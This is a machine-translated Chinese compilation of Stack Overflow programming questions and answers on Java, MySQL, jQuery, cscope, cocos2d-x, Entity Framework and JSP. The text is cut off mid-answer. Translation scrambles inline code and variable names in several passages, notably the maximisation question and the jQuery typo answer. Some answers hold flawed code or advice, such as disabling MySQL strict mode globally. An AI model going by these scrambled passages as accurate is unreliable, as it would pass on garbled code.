> 时间：2012-08-12T01:47:42.287

不，即使这是一个选项，这也是一个非常糟糕的主意，因为您会为每个请求添加大量延迟，因为您出于所有意图和目的都必须为每个请求打开一个新隧道。

您最好的选择可能是使用 Heroku 的开发层或入门层。如果您的数据库少于 10,000 行，则免费开发层将起作用。他们每月 15 美元的入门级适用于多达 1,000,000 行。

# java - 包含集合的 Hibernate 实体 - 如何在 JTable 中显示它

> ID：11917887
> 
> 赞同：1
> 
> 时间：2012-08-11T21:41:13.027
> 
> 标签：java, hibernate, swing, tablemodel

有一个简单的实体包含另一个`Document`实体的集合。

```
class Client{
    private int id;
    private String name; 
    private String secondName; 
    private Set<Document> documents = new HashSet()<Document>; 
    //getters and setters
} 
```

我想在 中显示所有客户`JTable`，但客户必须每次都出现在他拥有的每个文档中，例如，如果客户有 3 个文档在集合中，那么他应该出现在 3 行中，其中包含不同的文档。我已经写了我自己的`TableModel`. 有没有办法从休眠中检索这样合适的集合（我认为客户端列表中只有一个文档）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:08:14.653

对于这个两级视图，我会考虑两种选择：

*   `org.netbeans.swing.outline.Outline`，显示[在这里](https://codereview.stackexchange.com/a/4447/6692)，将是一个有吸引力的选择。

*   使用一个`JTable`来显示主行，并添加一个`ListSelectionListener`将更新第二个表的模型以显示主表中所选行的详细信息行。有关详细信息，请参阅[*用户选择*](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#selection)。

附录：在您的`TableModel`中，您可以在您的实现中查询数据库，如本[示例](http://rubenlaguna.com/wp/2009/08/17/jtable-and-jpa-pagination/index.html/)`getValueAt()`中所建议的那样。

# visualization - 使用 arbor.js 防止节点重叠

> ID：11917892
> 
> 赞同：2
> 
> 时间：2012-08-11T21:42:28.923
> 
> 标签：visualization, arbor.js

我正在尝试使用 arbor.js 制作动画。我想显示大约 50 到 100 个加权节点，其中权重定义了节点的大小。我能够显示所有节点，但较重的节点集中在中心并相互重叠。画布中有很多空白空间可用于展开节点。

有没有我可以用来不让节点重叠的设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-24T02:17:14.827

创建粒子系统时，使用更多的排斥力，即。10000 而不是默认的 1000：

`arbor.ParticleSystem(10000);`

这不会防止重叠，但可能会解决您的显示问题。

# python - 最大化功能：什么方法？

> ID：11917896
> 
> 赞同：3
> 
> 时间：2012-08-11T21:43:01.650
> 
> 标签：python, language-agnostic, max, mathematical-optimization

我有一个看起来像这样的函数：大约是 10 并且所有`f(x) = min(f_1(x_1), ..., f_n(x_n))`都是正单调的、平滑的，并且它们的值几乎总是（对于所有的）相差小于 10 倍。因此，它们似乎非常适合分析。 什么是最好的（快速？）方法来最大化它有这样的约束： -都是整数并且小于〜100 - 所有的产品应该靠近指定的值（假设，不超过它的10％）`n``f_i``x_i``f_i`

`x_i`
`x_i`

任何语言的算法描述都值得赞赏，但如果是 Python，那么它会好十倍:)

PS：早些时候我使用过遗传算法，并首先将它们应用于这项任务。然而，它似乎不是最好的选择：GA 很慢，我也想不出有效的交叉操作来解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:38:10.213

我没有立即看到比简单地随机选择一个起点，用每个输入 x_i 评估每个函数 f_i，确定最小输入，然后增加给出最低结果的函数的输入更好的解决方案。它不优雅，也不复杂，但它是一个很好的基线蛮力方法。

```
int (**f_is)(int n);

//...

int xs[10];

//...

while(true) {
    int i = 0;

    int cmin = f_is[0](i);
    int cminIndex = 0;

    for(i = 1; i < 10; ++i) {
        int cfunc = (f_is[i])(i);

        if(cmin < cfunc) {
            cmin = cfunc;
            cminIndex = i;
        }
    }

    ++xs[cminIndex];
} 
```

编辑：还有几件事：如果你并行计算 f_i(n_i) 并连接并取最小值，它会快得多，但你仍然需要一种方法来传达产生最小值的函数的索引给来电者。我会推荐 Haskell 作为一种很好的语言来编写它，因为它*比*python 快得多，并且在某些情况下，您可以毫不费力地获得出色的并发支持。

# jquery - jQuery 选择器可以选择所有具有“onclick”属性的元素吗？

> ID：11917897
> 
> 赞同：5
> 
> 时间：2012-08-11T21:43:04.197
> 
> 标签：jquery, jquery-selectors, attributes, onclick

基本上，我只想选择具有该属性的每个节点，`onclick`而不管其值如何。

我试过这个，但它不起作用：`$('[onlick]')`

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-11T21:51:42.783

如果您在and`c`之间添加 a ，它将起作用：`n``l``onlick``$('[onclick]')`

[你可以看到它在这里工作。](http://jsfiddle.net/z9N9Z/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-16T13:11:54.240

在 IE9 的事件处理程序中尝试它，不会工作。

```
$j(document).ready(function(){
    $j('[onclick]').addClass('turnedOff');
    $j('body').on('click', function(event) {
                           setTimeout(function(event) {
                   $j('[onclick]').removeClass('turnedOff');    
                }, 3000); 
    });
     }); 
```

第二个 $j('[onclick]') 失败。我必须创建一个删除类的函数。

这是关闭在 Asyn Ajax 调用中覆盖的页面上的 onclicks 的努力的一部分。一个糟糕的黑客来修复糟糕的设计。但它确实表明 $j('[onclick]') 在 IE9 的事件处理程序中不起作用

# vba - cell.Offset(0, 1).Value2 返回不可用的值？

> ID：11917898
> 
> 赞同：0
> 
> 时间：2012-08-11T21:43:08.093
> 
> 标签：vba, excel

我是 VBA 新手，所以请多多包涵。我有一个简单的电子表格，其中包含三列，我分别采用企业名称、城市和州（列 1、2 和 3），并使用它们调用 WhitePages API 以提取一些额外的数据。

如果我对值进行硬编码，它可以正常工作......

`url = "http://api.whitepages.com/find_business/1.0/?businessname=ABBOTT LABORATORIES;city=NORTH CHICAGO;state=IL;api_key=key"`

如果我使用`Value2`公司名称，它也可以正常工作......

`url = "http://api.whitepages.com/find_business/1.0/?businessname=" & cell.Value2 & ";city=NORTH CHICAGO;state=IL;api_key=key"`

但是，如果我在企业名称之后开始使用`Value2`任何东西，它就会完全失败。

`url = "http://api.whitepages.com/find_business/1.0/?businessname= " & cell.Value2 & ";city=" & cell.Offset(0, 1).Value2 & ";state=" & cell.Offset(0, 2).Value2 & ";api_key=key"`

当我`MsgBox`所有三个值时，它们看起来都很好，所以我得到了正确的数据。

在`XMLImport`这基本上返回，奇怪的是“成功”和“搜索没有返回结果”。

我错过了什么？我也尝试过实际更改活动单元格并以这种方式提取数据，而不是使用偏移量，但这也不起作用。

是否有一些偏移量返回了我无法使用的值？

即使是解决方法也将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T02:37:55.773

Try this

`url = "http://api.whitepages.com/find_business/1.0/?businessname= " & Trim(cell.Value) & ";city=" & Trim(cell.Offset(0, 1).Value) & ";state=" & Trim(cell.Offset(0, 2).Value) & ";api_key=key"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:32:37.753

您可以在之前将 Value2 转换为字符串：

```
CStr(cell.Offset(0,1).Value2)
CStr(cell.Offset(0,2).Value2) 
```

而MsgBox这些字符串结果，就知道返回的值是什么了。

# mysql - SQLSTATE[HY000]：一般错误：1366 整数值不正确：

> ID：11917899
> 
> 赞同：5
> 
> 时间：2012-08-11T21:43:15.070
> 
> 标签：mysql, zend-framework

```
$order = new Application_Model_DbTable_Order();

$orderno = $order->select()
->from($order, 'orderno')
->where('memberid = ?', $userid)
->order('orderno DESC')
->limit(1, 0); 
```

> SQLSTATE[HY000]：一般错误：1366 整数值不正确：'SELECT `ordertable`. `orderno`FROM `ordertable`WHERE (memberid = '30') ORDER BY `orderno`DESC LIMIT 1' 用于第 1 行的列 'orderno'

收到此错误，我想知道我的代码是否有任何问题，因为我到处寻找原因，但似乎没有找到任何帮助。

```
#SQL code for Ordertable#
`orderno` int(5) NOT NULL AUTO_INCREMENT,
`memberid` int(5) DEFAULT NULL,
PRIMARY KEY (`orderno`)

#SQL code for Item#
`itemid` int(5) NOT NULL AUTO_INCREMENT,
`image` varchar(100) NOT NULL,
`itemname` varchar(30) DEFAULT NULL,
`description` varchar(100) DEFAULT NULL,
`itemtype` varchar(20) DEFAULT NULL,
PRIMARY KEY (`itemid`)

#SQL code for Orderdetail#
`orderdetailno` int(5) NOT NULL AUTO_INCREMENT,
`orderno` int(5) NOT NULL,
`itemid` int(5) NOT NULL,
`unitcost` decimal(6,2) DEFAULT NULL,
PRIMARY KEY (`orderdetailno`),
KEY `orderno` (`orderno`),
KEY `itemid` (`itemid`) 
```

如果它有助于我使用 MySQL，这是我的 sql 代码。

```
$request = new Zend_Session_Namespace('cart');

$auth = Zend_Auth::getInstance();
$user = $auth->getIdentity();
$userid = $user->userid;

$order = new Application_Model_DbTable_Order();
$itemdb = new Application_Model_DbTable_Item();
$orderdetail = new Application_Model_DbTable_Orderdetail();

$data = array ('memberid' => $userid);
$order->insert($data);

$orderno = $order->select()
->from($order, 'orderno')
->where('memberid = ?', $userid)
->order('orderno DESC')
->limit(1, 0);

foreach ($request->array as $var)
{
$unitprice = $itemdb->select()
->from('$itemdb', 'unitcost')
->where('itemid = ?', $var);

$newArray = array('orderno' => $orderno,
'itemid' => $var,
'unitcost' => $unitprice, );

$orderdetail->insert($newArray);                    
} 
```

任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-12T02:28:52.313

根据[https://stackoverflow.com/a/8882396/1432614](https://stackoverflow.com/a/8882396/1432614)，运行

```
SELECT @@GLOBAL.sql_mode;
SELECT @@SESSION.sql_mode; 
```

如果包含`STRICT_TRANS_TABLES`，则将其从设置中删除。

例如：

```
SET @@GLOBAL.sql_mode= 'NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T06:14:47.507

您收到该错误的原因是您试图在语句中使用`Zend_Db_Select`对象作为值。`INSERT`

```
$orderno = $order->select()
                 ->from($order, 'orderno')
                 ->where('memberid = ?', $userid)
                 ->order('orderno DESC')
                 ->limit(1, 0); 
```

然后在`foreach`循环内：

```
$newArray = array('orderno' => $orderno,  // <-- this becomes a SELECT statment
                  'itemid' => $var,
                  'unitcost' => $unitprice, );

$orderdetail->insert($newArray); // attempting to insert a select statement 
```

如果你想在插入语句中使用它，你应该执行`$orderno`语句和结果：`fetch()`

```
$ordernum = $orderno->query()->fetch();

$newArray = array('orderno' => $ordernum,
                  'itemid' => $var,
                  'unitcost' => $unitprice, );

$orderDetail->insert($newArray); 
```

# php - 如何检测字符串中是否包含 UTF-8 字符？

> ID：11917911
> 
> 赞同：3
> 
> 时间：2012-08-11T21:45:28.980
> 
> 标签：php, unicode

> **可能重复：**
> [如何检测字符串中的非 ASCII 字符？](https://stackoverflow.com/questions/6497685/how-do-i-detect-non-ascii-characters-in-a-string)

我有一个表示 US-ASCII 音译表的数组，就像这个： `http://www.geopostcodes.com/encoding#az`

如果字符串具有这些字符之一，那么我将其替换为 ASCII 对应字符（带有`strtr`）。

因为数组很大，我希望将它加载到一个变量中，并且仅当字符串包含这些类型的 UTF-8 字符时才音译字符串。

有没有一种相当快速的方法来找出这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:50:27.543

没有真正的方法可以做到这一点。但是，如果您不需要任何高于 ASCII 127 的代码点（因此没有像 éáÿ 这样的“扩展 ASCII”），您可以检查是否有任何字节设置了第一位：

```
for (var i = 0; i < text.length; i++)
    if (ord(text[i]) > 127)
        // Unicode/UTF-8 character! 
```

# mysql - 使用 2 个范围的查询的索引设计

> ID：11917913
> 
> 赞同：5
> 
> 时间：2012-08-11T21:46:09.467
> 
> 标签：mysql, sql, indexing

当我的查询使用 2 个字段的范围时，我试图找出如何为我的数据设计索引。

```
expenses_tbl:
idx        date     category      amount
auto-inc   INT       TINYINT      DECIMAL(7,2)
PK 
```

列类别定义费用的类型。比如，娱乐、服装、教育等等。其他的栏目就很明显了。

我对该表的查询之一是查找在给定日期范围内费用超过 50 美元的所有实例。此查询将如下所示：

```
SELECT date, category, amount 
FROM expenses_tbl
WHERE date > 120101 AND date < 120811 
      AND amount > 50.00; 
```

如何为此特定查询设计此表上的索引/二级索引。

假设：表格非常大（目前还没有，但这给了我学习的空间）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:59:36.773

MySQL 通常不支持复合索引的多个部分的范围。它要么使用日期索引，要么使用金额索引，但不能同时使用两者。如果您有两个索引，每个索引一个，它可能会进行索引合并，但我不确定。

我会检查`EXPLAIN`添加这些索引之前和之后：

```
CREATE INDEX date_idx ON expenses_tbl (date);
CREATE INDEX amount_idx ON expenses_tbl (amount); 
```

复合索引范围 - [http://dev.mysql.com/doc/refman/5.5/en/range-access-multi-part.html](http://dev.mysql.com/doc/refman/5.5/en/range-access-multi-part.html)

索引合并 - [http://dev.mysql.com/doc/refman/5.0/en/index-merge-optimization.html](http://dev.mysql.com/doc/refman/5.0/en/index-merge-optimization.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:09:53.690

还有几点还没有提到：

索引中列的顺序可能会有所不同。您可能想尝试这两个索引：

```
(date, amount)
(amount, date) 
```

选哪个？通常，您希望最具*选择性*的条件是索引中的第一列。

*   如果您的日期范围很大，但很少有超过 50 美元的费用，那么您希望`amount`在索引中排在第一位。
*   如果您的日期范围很窄，并且大部分费用超过 50 美元，那么您应该`date`首先考虑。
*   如果两个索引都存在，那么 MySQL 将选择估计成本最低的索引。

您可以尝试添加两个索引，然后查看输出`EXPLAIN SELECT ...`以查看 MySQL 为您的查询选择的索引。

* * *

You may also want to consider a *covering* index. By including the column `category` in the index (as the last column) it means that all the data required for your query is available in the index, so MySQL does not need to look at the base table at all to get the results for your query.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:53:01.023

您的问题的一般答案是您想要一个具有两个键的复合索引。第一个是日期，第二个是金额。

请注意，此索引将适用于对日期或日期和费用有限制的查询。它不适用于仅对费用有限制的查询。如果您同时拥有这两种类型，则可能需要第二个费用索引。

如果表非常非常大，那么您可能希望按日期对其进行分区，并在每个分区内建立索引。

# ruby-on-rails - 如何将 LESS 文件添加到 Rails 应用程序

> ID：11917918
> 
> 赞同：4
> 
> 时间：2012-08-11T21:46:54.303
> 
> 标签：ruby-on-rails, asset-pipeline, less

我似乎无法让它在我的 Rails 应用程序中工作。在高层次上，我不想在我的应用程序中使用 LESS 并让它通过资产管道。

这是我的资产的样子：

```
assets
|
|--- javascript
|
|--- stylesheets
            |
            |-- reset.less
            |-- my-mixins.less
            |-- my-variables.less
            |-- base.less
|
|--- images
|
|--- libs
        |
        |---foo
            |
            |--css
                |
                |--- foo-mixins.less
                |
                |--- bar.less 
```

我想将“my-mixins.less”、“my-variables.less”和“foo-mixins.less”导入“base.less”以及其他文件。如果需要，还应将“bar.less”添加到特定页面。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:07:57.093

假设您使用的是 less-rails gem，这应该可以工作。

首先，将其添加到配置中的某个位置（我的 environment.rb 中有我的）：

```
YourApp::Application.configure do
  config.less.paths << File.join(Rails.root, 'app', 'assets', 'less')
end 
```

现在，如果您有这样的文件设置：

```
assets
|
|--- javascript
|
|--- css
|        |--- site-stylesheet.css.less
|
|--- less
         |--- my-mixins.less 
```

您可以使用以下命令在站点样式表中导入 my-mixins：

```
@import "my-mixins" 
```

并将样式表导入您的应用程序：

```
<%= stylesheet_link_tag "site-stylesheet" %> 
```

您应该能够从那里推断出您的特定目录结构。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:56:50.487

在 base.css.less 中，您可以编写`@import "my-variables.less";`并且它应该可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-12T17:24:16.710

这些文件必须位于“vendor/assets”或“vendor/plugins”（均位于根级别）文件夹中，以便使用相对路径引用它们。

# iphone - 如何让 iphone 像桌面浏览器一样浏览网页？

> ID：11917922
> 
> 赞同：1
> 
> 时间：2012-08-11T21:47:22.623
> 
> 标签：iphone, objective-c, ios, uiwebview, user-agent

我只想问他们是否可以让 iPhone 作为桌面浏览器浏览网页（不告诉服务器我正在使用移动设备）？或者，如果我可以采取一些措施来禁用对我的网络浏览器类型（移动、桌面）的检测？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T22:34:43.963

您可以使用以下内容更改您的用户代理`UIWebView`：

```
- (void)webViewDidFinishLoad:(UIWebView *)webView {
    NSLog(@"%@", [[webView request] valueForHTTPHeaderField: @"User-Agent"]);
}

NSMutableURLRequest *request = [[NSMutableURLRequest alloc]initWithURL:[NSURL URLWithString:@"yourwebsite.com"]];
[request setHTTPMethod:@"POST"];
[request setValue:USERAGENT_STRING forHTTPHeaderField: @"User-Agent"];
[webView loadRequest:request]; 
```

只需将 USERAGENT_STRING 替换为您想要的任何浏览器用户代理，这些都是可搜索的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:02:58.740

iPhone 上有一个名为**Mercury的浏览器应用程序**
[http://itunes.apple.com/us/app/mercury-web-browser-most-advanced/id331012646?mt=8](http://itunes.apple.com/us/app/mercury-web-browser-most-advanced/id331012646?mt=8)
你可以从 iTunes 下载它，你可以从它的设置选择任何浏览器模拟为 IE&、IE8、Chrome、Firefox。我觉得很神奇

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T22:31:44.930

您可以使用[Puffin Browser](http://www.puffinbrowser.com/)，它是一款真正的云端桌面 Chrome 浏览器，因此它可以快速将预渲染的网站流式传输到您的 iPad/iPhone，甚至还支持 Flash！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-11T22:20:00.887

Atomic Web Browser 是我找到的最好的浏览器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-03T09:10:24.417

它适用于IOS6。

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
    if ([(NSMutableURLRequest *)request respondsToSelector:@selector(setValue:forHTTPHeaderField:)]) {
        [(NSMutableURLRequest *)request setValue:@" Safari/537.1" forHTTPHeaderField:@"User_Agent"];
    }
} 
```

# c++ - 如何将 cscope 用于具有 .c 、 .cpp 和 .h 文件的项目？

> ID：11917923
> 
> 赞同：7
> 
> 时间：2012-08-11T21:47:24.143
> 
> 标签：c++, c, llvm, cscope

我正在开发一个需要了解[llvm](http://llvm.org/)编译器源代码的项目。为了浏览 llvm 的源代码，我尝试在源的根目录中使用 cscope 和以下命令：

> cscope -R *

但它不起作用。因为主要有 .cpp 和 .h 文件，但也有一些 .c 文件。所以现在我不知道如何让 cscope 工作？有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-11T21:55:42.903

您可以使用以下命令从 llvm 源代码树的根目录执行所需的任务：

```
touch tags.lst
find | grep "\.c$" >> tags.lst
find | grep "\.cpp$" >> tags.lst
find | grep "\.h$" >> tags.lst
cscope -i tags.lst 
```

它将创建 cscope.out 文件，该文件与 cscope 一起用于浏览代码。希望能帮助到你！

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-08-22T15:58:49.497

列出项目中所有`C++`文件的一种便捷方法是使用[ack](http://beyondgrep.com/)工具：一个类似 grep 的命令，针对源代码搜索进行了优化（在某些发行版中，例如 Ubuntu，该工具称为`ack-grep`）。你可以像这样运行它：

```
ack -f --cpp > cscope.files 
```

`.cpp`输出是所有, `.h`,`.cc` `.hpp`文件的路径

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-07-05T20:38:16.920

只是因为这仍然是最受欢迎的条目。在此期间可能已经添加了 stdin 的东西，但它使它有点优雅：

```
find -regex '.*\.\(c\|h\|cpp\|cxx\|hh\|hpp\|hxx\)$' | cscope -i- -b -q 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-09-24T05:55:06.953

我的 .bashrc 中有以下内容，这使事情变得更容易。运行`cscope_build()`以生成数据库并`cscope`启动 cscope 工具。

```
# Use vim to edit files
export CSCOPE_EDITOR=`which vim`

# Generate cscope database
function cscope_build() {
  # Generate a list of all source files starting from the current directory
  # The -o means logical or
  find . -name "*.c" -o -name "*.cc" -o -name "*.cpp" -o -name "*.h" -o -name "*.hh" -o -name "*.hpp" > cscope.files
  # -q build fast but larger database
  # -R search symbols recursively
  # -b build the database only, don't fire cscope
  # -i file that contains list of file paths to be processed
  # This will generate a few cscope.* files
  cscope -q -R -b -i cscope.files
  # Temporary files, remove them
  # rm -f cscope.files cscope.in.out cscope.po.out
  echo "The cscope database is generated"
}
# -d don't build database, use kscope_generate explicitly
alias cscope="cscope -d" 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-11T21:54:26.920

为了覆盖我们的大型代码库，我有一个看起来有点像这样的脚本来构建 cscope 索引。我更改为 / 的原因是我有源文件的完整文件路径，这使得工作更顺利一些。

```
cd /
find -L /home/adrianc/code -name "*.c" -o -name "*.cc" -o -name "*.h" > /home/adrianc/code/cscope.files
cd /home/adrianc/code
/usr/local/bin/cscope -b -icscope.files -q -u 
```

也值得一试 [http://cscope.sourceforge.net/cscope_vim_tutorial.html](http://cscope.sourceforge.net/cscope_vim_tutorial.html)

# entity-framework - 在单独的查询中加载相关实体并对子集合进行排序

> ID：11917926
> 
> 赞同：2
> 
> 时间：2012-08-11T21:47:43.980
> 
> 标签：entity-framework, ef-code-first

我需要首先使用 EF 4.1 代码检索包含在几个相关表中的数据。目前，如果我使用这个

```
return Context.Set<Entity>()
              .Include(x => x.Children.Select(y => y.GrandChildren.Select(z => z.Child)))
              .Include(x => x.SomeEntity)
              .Include(x => x.AnotherEntity)
              .OrderByDescending(x => x.Id)
              .FirstOrDefault(); 
```

数据已正确获取，但我担心两件事：

1）似乎没有办法对Chilren / GrandChildren进行排序

2）数据在一个表中被展平，这意味着实体（和所有其他）数据对于每个 GrandChild 记录都是重复的

问题：

*   我需要做什么才能对儿童/孙子进行排序？
*   在这种特殊情况下，第二点本身可能不是问题，因为传输的数据量不大 - 最多 30 条记录和 30 列。不过，我想知道是否有办法分别加载实体、儿童和孙子（3 个查询），并在客户端站点上加入它们？

返回的结果集需要可更新。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T09:52:46.217

> 我需要做什么才能对儿童/孙子进行排序？

在您的应用程序中对它们进行排序。这是唯一可靠的方法。Include 根本不允许排序，下面显示的方法不可靠，因为您无法控制 EF 的内部机制，并且您不能将导航属性作为`SortedList`或其他集合维护排序顺序（这是可靠排序的要求关系）。

> 数据在一个表中展平，这意味着每个 GrandChild 记录的实体（和所有其他）数据都是重复的

这是[有效的反对意见](https://stackoverflow.com/questions/5521749/how-many-include-i-can-use-on-objectset-in-entityframework-to-retain-performance/5522195#5522195)。您可以通过关闭延迟加载并使用单独的查询来加载数据来避免它：

```
context.Configuration.LazyLoadingEnabled = false;
var parent = context.Set<Entity>().First(e => e.Name = "ABC");
// Load relations in separate query
context.Set<Child>()
       .Where(c => c.Parent.Name == "ABC")
       .OrderBy(c => c.Name) // You can at least try it but as mentioned above it may not work in all scenarios
       .Load();
// Now parent.Children collection should be filled 
```

您也可以对其他关系和嵌套关系采用相同的方法。关键是正确构建`Where`子孙加载条件。

这并不意味着这种方法会比扁平表更快。这种方法为每个执行的查询进行单独的数据库往返，因此扁平表在较小的数据集中可以更快。

# cocos2d-iphone - cocos2d-x中的callfunc

> ID：11917928
> 
> 赞同：2
> 
> 时间：2012-08-11T21:48:26.847
> 
> 标签：cocos2d-iphone, cocos2d-x

在 cocos2d-x 中，下面这段代码应该会在延迟后运行回调函数。我需要做什么来修复错误？

```
bool LoadingLevelScreen::initialise() {

        // set up the time delay
    CCDelayTime *delayAction = CCDelayTime::actionWithDuration(0.5f);

    // perform the selector call
    CCCallFunc *callSelectorAction = CCCallFunc::actionWithTarget( 
        this, callfunc_selector( LoadingLevelScreen::menuCallbackStart ) );

    // run the action
    this->runAction( CCSequence::actions(
        delayAction, callSelectorAction, NULL ) );
}

void LoadingLevelScreen::menuCallbackStart(CCObject * pSender)
{
} 
```

编译器错误：

```
error C2440: 'type cast' : 
cannot convert from 'void (__thiscall LoadingLevelScreen::* )(cocos2d::CCObject *)' 
to 'cocos2d::SEL_CallFunc'
Pointers to members have different representations; cannot cast between them 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T18:58:48.780

要么删除方法中的`CCObject*`参数`menuCallbackStart()`（因为`CCCallFunc::actionWithTarget()`需要一个没有参数的方法），要么更改`CCCallFunc`为`CCCallFuncO`哪个需要一个`CCObject*`作为参数的方法，如下所示：

```
CCCallFuncO * callSelectorAction =
    CCCallFuncO::create(this, &LoadingLevelScreen::menuCallbackStart, myObject); 
```

将作为参数传递给您的方法的`myObject`a在哪里。`CCObject *`

请注意，这`callfunc_selector()`只是一个将您的方法类型转换为的宏`SEL_CallFunc`：

```
#define callfunc_selector(MYSELECTOR) (SEL_CallFunc)(& (MYSELECTOR)) 
```

BTW`::actionWithTarget()`已被弃用，因此请`::create()`改用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-12T22:59:59.320

```
void LoadingLevelScreen::menuCallbackStart(CCObject * pSender)
{
} 
```

应该

```
void LoadingLevelScreen::menuCallbackStart()
{
} 
```

callfunc_selector 与 menu_selector 不同，您不需要 CCObject* 作为变量传入

如果您确实需要传递参数，请使用 callFuncND

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-10-02T05:55:05.140

this->runAction(Sequence::create(CallFunc::create(std::bind(&CNm::MNm, this)),NULL));

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-30T13:14:27.380

this->runAction(Sequence::create(CallFunc::create(std::bind(&ClassName::MethodName, this)),NULL));

# java - ArrayList 上的 for 循环更改对象

> ID：11917931
> 
> 赞同：0
> 
> 时间：2012-08-11T21:49:11.000
> 
> 标签：java, jsp, servlets, arraylist, request

我有一个jsp页面（说，`MyJspPage.jsp`）-

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<%
    ArrayList<Person> ownerList = (ArrayList<Person>) request
            .getAttribute("ownerList");
    //set again ..
        request.setAttribute("ownerList",ownerList) ;   

%>
</head>
<body>
        <%
            //itr on all the persons ..;
            for (Person person : ownerList) {
        %>
                    // some HTML code.. 
        <%
            }
        %>
            <form action="servlet123" method="POST">
                   // some fields .. 
                   <input type="submit" value="join" />
    </form>

</body>
</html> 
```

还有一个 servlet -

```
@WebServlet("/servlet123")
public class servlet123 extends HttpServlet {
    private static final long serialVersionUID = 1L;

    protected void doPost(HttpServletRequest request,
            HttpServletResponse response) throws ServletException, IOException {
        // get the then set .. 
             ArrayList<Person> ownerList = (ArrayList<Person)request.getAttribute("ownerList"); 
        request.setAttribute("ownerList", ownerList);
             // forward to `MyJspPage.jsp`
            dispather.forward(request, response);
        }

} 
```

首先是另一个 servlet 转发到它工作正常，然后在and`MyJspPage.jsp`之间就像乒乓球一样 。问题是，当第二次到达它时会引发异常 -`MyJspPage.jsp``servlet123``MyJspPage.jsp`

```
type Exception report

message java.lang.NullPointerException

description The server encountered an internal error (java.lang.NullPointerException) that prevented it from fulfilling this request.

exception 

org.apache.jasper.JasperException: java.lang.NullPointerException
    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:549)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
```

应该注意的是，当我从 MyJspPage.jsp 中省略 for 循环并将其更改为 -

```
 <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <%
        ArrayList<Person> ownerList = (ArrayList<Person>) request
                .getAttribute("ownerList");
        //set again ..
            request.setAttribute("ownerList",ownerList) ;   

    %>
    </head>
    <body>
                <form action="servlet123" method="POST">
                       // some fields .. 
                       <input type="submit" value="join" />
        </form>

    </body>
    </html> 
```

`MyJspPage.jsp`和回报之间的所有关系都`servlet123`很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T09:14:44.127

这是一种方法。

JSP代码如下

* * *

您可以在会话中设置它，而不是在请求中再次设置数组列表，如下所示 `session.setAttribute("ownerList",ownerList) ;`

您可以在 for 循环中使用 arraylist 之前检查它是否为 NOT null。

```
 if (ownerList != null)
        {
          for (Person person : ownerList) {
    %>
                // some HTML code.. 
    <%
          }
        }
    %> 
```

在 servlet 中，您可以将代码编写为

```
 HttpSession session = request.getSession(false);
 ArrayList<Person> ownerList = (ArrayList<Person)session.getAttribute("ownerList"); 
 request.setAttribute("ownerList", ownerList);
 session.setAttribute("ownerList", null); // toremove unnecessary code from the session 
```

也可能有其他方法。这个更接近你选择的那个。

# javascript - JQuery 在 Chrome 中不起作用，但 Firefox 很好

> ID：11917935
> 
> 赞同：1
> 
> 时间：2012-08-11T21:50:02.373
> 
> 标签：javascript, jquery, google-chrome

我在使用 Firefox 而不是 Chrome 的简单 Javascript 代码时遇到了麻烦。

这是我的功能

```
function ToggleArrow(id1, id2)
{
    var display = window.getComputedStyle(id1).getPropertyValue('display');

    if (display=="none") {
        $(id2).fadeToggle(100, function(){$(id1).fadeToggle(100);});
    } else {
        $(id1).fadeToggle(100, function(){$(id2).fadeToggle(100);});
    }
} 
```

Chrome 实际上甚至没有通过第一行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:04:14.130

由于您使用的是 jQuery，因此您可以使用`.is(':visible')`

```
function ToggleArrow(id1, id2)
{
    if (!$(id1).is(':visible')) // If not visible
        $(id2).fadeToggle(100, function(){$(id1).fadeToggle(100);});
    else 
